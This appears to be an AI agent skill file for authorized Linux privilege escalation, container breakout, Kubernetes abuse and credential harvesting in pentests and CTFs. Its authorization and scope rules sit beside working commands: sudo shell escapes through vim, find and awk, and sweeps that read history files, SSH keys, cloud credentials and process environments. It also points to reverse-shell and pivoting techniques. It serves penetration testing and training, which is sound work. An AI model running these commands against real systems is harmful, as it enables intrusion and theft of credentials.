---
name: privilege-escalation
description: >
  Assess authorized Linux privilege escalation, container escapes, and post-exploitation paths in pentests and CTFs.
license: MIT
compatibility: Requires authorized access to target Linux systems and bash/python
metadata:
  source: iuliandita/skills
  date_added: "2026-03-25"
  effort: high
  argument_hint: "<target>"
---

# Privilege Escalation and Post-Exploitation Assessment

Systematic privilege escalation methodology for authorized security assessments, CTF
challenges, and penetration testing engagements. Covers Linux systems, containers, Kubernetes
clusters, VPN infrastructure, and IaC credential exposure.

This skill is offensive - it assumes you have initial access and guides escalation to higher
privileges. For defensive hardening and vulnerability scanning, use the **security-audit** skill
instead.

## When to use

- Authorized penetration testing engagements (with written scope)
- CTF challenges and security training labs (HTB, THM, PG, etc.)
- Post-exploitation enumeration after gaining initial shell access
- Red team exercises with defined rules of engagement
- Assessing your own infrastructure for privilege escalation paths
- Container escape and Kubernetes RBAC abuse testing
- VPN credential extraction and lateral movement assessment

## When NOT to use

- Defensive security reviews or hardening (use **security-audit**)
- Application code vulnerability scanning / SAST (use **security-audit**)
- VPN setup, configuration, or troubleshooting (use **networking**)
- Firewall rule auditing (use **opnsense-pfsense**)
- Docker image hardening or Dockerfile review (use **docker**)
- Kubernetes manifest security review (use **kubernetes**)
- CI/CD pipeline security (use **ci-cd**)
- Without written authorization from the system owner

---

## AI Self-Check

Before executing any technique or generating exploitation commands, verify:

- [ ] **Authorization confirmed**: written scope document or CTF/lab context established
- [ ] **Target in scope**: IP/hostname/namespace is within the authorized boundary
- [ ] **No production data access**: avoid reading actual user data beyond what's needed to prove access
- [ ] **Evidence captured**: command output logged for the report before moving on
- [ ] **Cleanup planned**: any files dropped, users created, or configs modified are tracked for removal
- [ ] **No destructive actions**: kernel exploits tested in lab first, no `rm -rf`, no disk writes to critical paths
- [ ] **Architecture matched**: exploit/payload matches target arch (`uname -m`). x86_64 exploits don't work on ARM, 32-bit payloads fail on 64-bit-only systems
- [ ] **Reverse shells use authorized ports**: listener IP and port match the engagement plan
- [ ] Cross-cutting agent hygiene applied - see `references/agent-hygiene.md`

---

## Performance

- Run low-noise enumeration first; expensive scanners and brute-force tools require scope and rate limits.
- Capture command output as you go so repeated enumeration is unnecessary.
- Prioritize likely local privesc paths from kernel, sudo, SUID, services, containers, and writable paths before broad tool dumps.


---

## Best Practices

- Keep CTF shortcuts out of real pentest guidance unless the user says it is a CTF.
- Document exact preconditions and proof for every privilege boundary crossed.
- Do not install persistence or cleanup evidence unless the engagement explicitly requires and authorizes it.


## Workflow

### Phase 1: Situational Awareness

Determine what you're working with before trying anything.

```bash
# Who am I, what can I do?
id && hostname && uname -a && cat /etc/*-release 2>/dev/null

# Container indicators; missing markers do not prove this is the host
cat /proc/1/cgroup 2>/dev/null
ls -la /.dockerenv 2>/dev/null && echo "Docker container detected"
cat /proc/self/mountinfo | grep -q 'kubepods' && echo "Kubernetes pod detected"

# What's the network look like?
ip addr && ip route && ss -tulpn
```

**Decision tree:**
- **Bare metal / VM** -> Phase 2 (Linux privesc)
- **Docker container** -> Phase 5 (container breakout)
- **Kubernetes pod** -> Phase 6 (k8s privesc)
- **Any of the above** -> also check Phase 4 (VPN/secrets) and Phase 7 (IaC)

### Phase 2: Linux Privilege Escalation

Core Linux privesc methodology. Start with automated enumeration, then work through
manual techniques.

**Sudo GTFOBins quick-reference** (top-5 CTF patterns, inline):
```
sudo vim        -> :!bash  (or :set shell=/bin/bash :shell)
sudo less       -> !bash
sudo find       -> sudo find / -name x -exec /bin/bash \;
sudo awk        -> sudo awk 'BEGIN {system("/bin/bash")}'
sudo nmap       -> sudo nmap --interactive  (then !sh)  [older nmap only]
```
Run `sudo -l` first - if any of these appear, escalation is one command away.

Read `references/linux-privesc.md` for the full technique library
covering:

1. **Automated enumeration** - LinPEAS, pspy, Linux Exploit Suggester
2. **Sudo abuse** - `sudo -l` misconfigs, GTFOBins, LD_PRELOAD, env_keep
3. **SUID/SGID binaries** - find + exploit via GTFOBins
4. **Linux capabilities** - `getcap`, cap_setuid, cap_dac_read_search
5. **Cron jobs** - writable scripts, PATH hijacking in cron context
6. **Kernel exploits** - version-matched CVEs (Dirty Pipe, nf_tables, io_uring, OverlayFS; 2026: Copy Fail CVE-2026-31431 [CISA KEV, exploited], Dirty Frag CVE-2026-43284/43500, Fragnesia CVE-2026-46300 [ESP-in-TCP, no in-the-wild exploitation reported], ptrace CVE-2026-46333)
7. **PATH hijacking** - SUID binaries calling relative commands
8. **NFS** - no_root_squash exploitation
9. **Writable files** - /etc/passwd, /etc/shadow, authorized_keys, systemd units
10. **Wildcard injection** - tar, chown, rsync with wildcards in cron/scripts

**Priority order**: sudo > SUID > capabilities > cron > writable files > kernel exploits.
Kernel exploits are last resort - they can crash the system.

### Phase 3: Credential Harvesting

After initial enumeration, sweep for credentials before escalating.

```bash
# History files
cat ~/.bash_history ~/.zsh_history ~/.mysql_history 2>/dev/null

# Config files with passwords
grep -rils 'password\|passwd\|pass\|secret\|token\|key\|api' \
  /etc/ /opt/ /var/ /home/ /root/ 2>/dev/null | head -30

# SSH keys
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' \
  -o -name '*.pem' -o -name '*.key' 2>/dev/null

# Database credentials
cat /etc/mysql/debian.cnf 2>/dev/null
cat /var/www/*/wp-config.php 2>/dev/null
grep -r 'DATABASE_URL\|DB_PASS\|POSTGRES_PASSWORD' /opt/ /srv/ /var/ 2>/dev/null

# Cloud credentials
cat ~/.aws/credentials ~/.config/gcloud/credentials.db 2>/dev/null
env | grep -iE 'aws|azure|gcp|cloud|token|key|secret|pass'

# Process memory (credentials in running services)
# Read environ of interesting processes (web servers, databases, agents)
for pid in $(pgrep -f 'nginx\|apache\|postgres\|mysql\|node\|python\|java' 2>/dev/null); do
  echo "=== PID $pid ($(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')) ==="
  cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|secret|token|key|dsn|database_url'
done
```

### Phase 4: VPN & Tunnel Credential Extraction

Check for VPN configurations that reveal keys, topology, or credentials for lateral movement.

Read `references/vpn-iac-secrets.md` for the full technique library
covering:

1. **WireGuard** - `/etc/wireguard/*.conf` private key extraction, peer topology mapping, AllowedIPs as network map, PreUp/PostUp script injection
2. **OpenVPN** - `.ovpn` embedded certs/keys, `auth-user-pass` credential files, management interface abuse (port 7505), plugin loading (CVE-2024-27903 chain)
3. **IPsec** - `/etc/ipsec.secrets` PSK/RSA extraction, `ike-scan` aggressive mode hash capture + offline cracking, swanctl credential theft
4. **SSH agent hijacking** - `SSH_AUTH_SOCK` socket theft from other users, key injection, tunnel pivoting (`-L`, `-R`, `-D`)

### Phase 5: Container Breakout

If you're inside a container, inspect its isolation boundaries. **Rootful privileged containers are high risk**, but effective host access depends on the runtime, user namespaces, exposed devices, and remaining security policy. Capabilities alone do not prove privileged mode or host root access.

Read `references/container-breakout.md` for the full technique library
covering:

1. **Docker socket** - writable rootful daemon socket can grant host root access
2. **Privileged mode** - `--privileged` -> mount host filesystems, load kernel modules
3. **Dangerous capabilities** - SYS_ADMIN (cgroup escape), SYS_PTRACE (process injection), DAC_READ_SEARCH (shocker), SYS_MODULE
4. **Host mounts** - `/host`, `/mnt`, or host paths mounted into container
5. **Docker group** - user in `docker` group = effective root
6. **Runtime CVEs** - runc (CVE-2024-21626 Leaky Vessels), containerd, BuildKit
7. **cgroup escape** - v1 release_agent abuse (CVE-2022-0492), notify_on_release
8. **Namespace escape** - nsenter, /proc/1/root, user namespace breakout

**Quick check:**
```bash
# Read-only clues; confirm privileged mode from runtime configuration
grep -E "CapEff|CapBnd|NoNewPrivs|Seccomp" /proc/self/status
cat /proc/self/uid_map
# Docker socket?
ls -la /var/run/docker.sock 2>/dev/null
# Capabilities?
cat /proc/self/status | grep -i capeff
# capsh if available
capsh --print 2>/dev/null
# Host mount?
mount | grep -E '^/dev/' | grep -v 'overlay'
```

### Phase 6: Kubernetes Privilege Escalation

If you're inside a k8s pod or have access to a kubeconfig.

Read `references/kubernetes-privesc.md` for the full technique library
covering:

1. **ServiceAccount token** - auto-mounted at `/var/run/secrets/kubernetes.io/serviceaccount/`, API access, token scoping (pre/post 1.24)
2. **RBAC abuse** - wildcard permissions, escalate/bind verbs, create pods + get secrets, impersonation
3. **Pod creation** - schedule privileged pods, hostPath mounts, node selectors
4. **etcd direct access** - default port 2379, client cert theft, secret extraction
5. **Kubelet API** - anonymous auth on 10250, exec into any pod, node-level access
6. **Node-to-cluster** - kubeconfig files, static pod manifests, CNI creds, cloud IMDS
7. **Pod Security bypass** - namespace label manipulation, admission controller gaps

**Permission checks:** first verify that the selected context authenticates as the
intended pod ServiceAccount and uses the intended cluster. A local administrator context
would test the wrong identity. With a correctly configured kubectl client:
```bash
kubectl --context "$KUBE_CONTEXT" auth can-i list secrets --namespace "$NAMESPACE"
kubectl --context "$KUBE_CONTEXT" auth can-i create pods --namespace "$NAMESPACE"
```
These authorization checks do not retrieve secret values or create a test pod. Admission
policy can still reject an operation that RBAC permits. Without kubectl, use the mounted
ServiceAccount curl checks in `references/kubernetes-privesc.md` (Quick Assessment).

### Phase 7: IaC & Cloud Credential Exposure

Sweep the filesystem for infrastructure-as-code secrets.

Read `references/vpn-iac-secrets.md` (IaC Secrets section) for the full
technique library covering:

1. **Terraform** - `terraform.tfstate` contains plaintext secrets, `.terraform/` provider creds, `TF_VAR_*` env vars, remote state backend credentials
2. **Ansible** - vault cracking (`ansible2john` + hashcat -m 16900), plaintext `group_vars/`, vault password files, inventory SSH keys
3. **Cloud IMDS** - AWS `169.254.169.254`, GCP `metadata.google.internal`, Azure metadata headers, IMDSv2 bypass, Kubernetes pod-to-IMDS access
4. **kubeconfig files** - `~/.kube/config`, `/etc/kubernetes/admin.conf`, embedded certs/tokens
5. **Sealed Secrets** - controller private key = decrypt everything
6. **CI/CD credentials** - `.env` files, runner tokens, registry credentials

### Phase 8: Lateral Movement & Pivoting

Once you've escalated, pivot to other systems.

**Stop before any pivot whose destination is outside the authorized scope.** Confirm the
destination host, network, or account is named in the engagement scope or rules of
engagement. If it is not, do not connect; report the reachable path instead.

Read `references/shells-and-pivoting.md` for:

1. **Reverse shells** - bash, python, perl, netcat, php, ruby, powershell
2. **SSH tunneling** - local forwarding (-L), remote forwarding (-R), dynamic SOCKS (-D), ProxyJump chains
3. **SSH agent hijacking** - stealing SSH_AUTH_SOCK from other users for key reuse
4. **Port forwarding** - use SSH tunneling (item 2) by default when the pivot runs sshd; for hosts without SSH, use chisel for an HTTP/SOCKS tunnel or ligolo-ng for a routed TUN interface
5. **Internal network scanning** - quick TCP sweep without nmap
6. **File transfer** - curl, wget, nc, python http.server, base64 encoding

---

## Enumeration Quick Reference

| Vector | Command |
|--------|---------|
| Kernel version | `uname -r` |
| Current user | `id` |
| Sudo rights | `sudo -l` |
| SUID binaries | `find / -perm -u=s -type f 2>/dev/null` |
| SGID binaries | `find / -perm -g=s -type f 2>/dev/null` |
| Capabilities | `getcap -r / 2>/dev/null` |
| Cron jobs | `cat /etc/crontab; ls -la /etc/cron.*` |
| Cron (live) | `pspy` (no root needed, watches /proc) |
| Writable dirs | `find / -writable -type d 2>/dev/null` |
| Writable files | `find /etc -writable -type f 2>/dev/null` |
| NFS exports | `cat /etc/exports` |
| WireGuard | `ls /etc/wireguard/; wg show 2>/dev/null` |
| OpenVPN | `find / -name '*.ovpn' 2>/dev/null` |
| IPsec secrets | `cat /etc/ipsec.secrets 2>/dev/null` |
| SSH keys | `find / -name 'id_*' -o -name '*.pem' 2>/dev/null` |
| Docker socket | `ls -la /var/run/docker.sock 2>/dev/null` |
| K8s SA token | `cat /var/run/secrets/kubernetes.io/serviceaccount/token` |
| Container? | `cat /proc/1/cgroup 2>/dev/null \| grep -qiE docker\|kube` |
| Cloud IMDS | `curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null` |
| Terraform state | `find / -name 'terraform.tfstate*' 2>/dev/null` |
| Ansible vault | `grep -rl '\$ANSIBLE_VAULT' / 2>/dev/null` |

---

## Tools

| Tool | Purpose | Source |
|------|---------|--------|
| LinPEAS | Automated Linux enumeration | [PEASS-ng](https://github.com/peass-ng/PEASS-ng) |
| pspy | Process snooping without root | [pspy](https://github.com/DominicBreuker/pspy) |
| Linux Exploit Suggester | Kernel exploit matching | [les](https://github.com/The-Z-Labs/linux-exploit-suggester) |
| GTFOBins | SUID/sudo/cap binary abuse | [gtfobins.github.io](https://gtfobins.github.io) |
| CDK | Container/K8s pentest toolkit | [CDK](https://github.com/cdk-team/CDK) |
| deepce | Docker enumeration/escape | [deepce](https://github.com/stealthcopter/deepce) |
| kubectl-who-can | RBAC permission checker | [kubectl-who-can](https://github.com/aquasecurity/kubectl-who-can) |
| kube-hunter | K8s cluster vulnerability scan | [kube-hunter](https://github.com/aquasecurity/kube-hunter) |
| Peirates | K8s pentest tool | [peirates](https://github.com/inguardians/peirates) |
| kubeletctl | Kubelet API interaction | [kubeletctl](https://github.com/cyberark/kubeletctl) |
| ike-scan | IKE/IPsec enumeration + PSK capture | [ike-scan](https://github.com/royhills/ike-scan) |
| chisel | TCP/UDP tunnel over HTTP | [chisel](https://github.com/jpillora/chisel) |
| ligolo-ng | Tunneling with TUN interface | [ligolo-ng](https://github.com/nicocha30/ligolo-ng) |

---

## Reference Files

- `references/linux-privesc.md` - core Linux privesc techniques (sudo, SUID, cron, capabilities, kernel exploits, PATH hijack, NFS, wildcards)
- `references/container-breakout.md` - Docker and container escape techniques (socket, privileged, capabilities, cgroups, runtime CVEs)
- `references/kubernetes-privesc.md` - Kubernetes RBAC abuse, ServiceAccount exploitation, etcd, kubelet, pod creation, PSS bypass
- `references/vpn-iac-secrets.md` - VPN credential extraction (WireGuard, OpenVPN, IPsec) and IaC secrets exposure (Terraform, Ansible, cloud IMDS)
- `references/shells-and-pivoting.md` - reverse shells, SSH tunneling, agent hijacking, port forwarding, file transfer

---

## Scope Boundaries

**Windows targets**: This skill covers Linux, containers, and Kubernetes. Windows privilege escalation (token impersonation, SeImpersonatePrivilege, PrintSpoofer, AD abuse, Kerberoasting) is a separate domain not covered here. For Windows CTF/pentest, research Windows-specific tooling (WinPEAS, PowerUp, Rubeus, BloodHound) directly.

---

## Evidence Capture Template

Rule 4 says document everything. Use this structure per finding:

```
## Finding: [short name]
- **Vector**: [sudo/SUID/cron/container/k8s/kernel/etc.]
- **Access before**: [user/group, e.g., www-data]
- **Access after**: [user/group, e.g., root]
- **Steps**: [numbered list of exact commands run]
- **Proof**: [command output showing escalated access, e.g., id, whoami, cat /root/proof.txt]
- **Cleanup**: [files created, users added, configs changed - and how to reverse]
- **Remediation**: [what the defender should fix]
```

Capture `script -q /tmp/session.log` at the start of each engagement to get a full terminal transcript.

---

## Output Contract

See `references/output-contract.md` for the full contract.

- **Skill name:** PRIVILEGE-ESCALATION
- **Deliverable bucket:** `audits`
- **Mode:** conditional. When invoked to **analyze, review, audit, or improve** existing repo content, apply the reporting size and evidence rules in `references/output-contract.md` and write the deliverable to `docs/local/audits/privilege-escalation/<YYYY-MM-DD>-<slug>.md`. When invoked to **answer a question, teach a concept, build a new artifact, or generate content**, respond freely without the contract.
- **Severity scale:** `P0 | P1 | P2 | P3 | info` (see shared contract; only used in audit/review mode).

## Related Skills

- **security-audit** - defensive counterpart. Finds vulnerabilities through SAST, dependency scanning, and config review. This skill exploits them. Use security-audit for hardening; use privilege-escalation for proving exploitability.
- **networking** - configures and troubleshoots VPNs, DNS, proxies, firewalls. This skill's VPN section extracts credentials and keys from existing configs for lateral movement. Use networking for setup; use privilege-escalation for exploitation.
- **kubernetes** - writes and reviews k8s manifests and Helm charts. This skill's k8s section attacks the cluster from inside a compromised pod. Use kubernetes for building; use privilege-escalation for breaking.
- **docker** - Dockerfile and Compose authoring. This skill's container section escapes from running containers. Use docker for building images; use privilege-escalation for escaping them.
- **opnsense-pfsense** - OPNsense/pfSense firewall management. This skill does not cover network-level firewall testing.
- **ansible** - playbook and role authoring. This skill's IaC section targets Ansible vault cracking and credential extraction, not playbook writing.
- **terraform** - IaC authoring. This skill's IaC section targets state file secret extraction, not Terraform module design.

---

## Rules

1. **Authorization is non-negotiable.** Every technique requires written authorization or a CTF/lab context. No exceptions, no "it's my own box" without explicit confirmation.
2. **Enumerate before exploiting.** Run through the full enumeration checklist before attempting kernel exploits or destructive techniques. The easy wins (sudo, SUID, cron) are safer and more reliable.
3. **Kernel exploits are last resort.** They can crash the system, corrupt memory, or trigger panic. Try everything else first. Test in a lab environment when possible.
4. **Document everything.** Capture command output before moving to the next technique. Evidence of the escalation path is the deliverable, not just root access.
5. **Clean up after yourself.** Track files created, users added, configs modified. Remove them at the end of the engagement or note them for the client.
6. **Don't access unnecessary data.** Proving root access doesn't require reading actual user data. A `whoami` or `/root/proof.txt` is enough.
7. **Stay in scope.** Lateral movement to systems outside the authorized boundary is out of scope unless explicitly permitted.
8. **Prefer living off the land.** Use tools already on the system before uploading custom binaries. Less forensic footprint, fewer detection triggers.
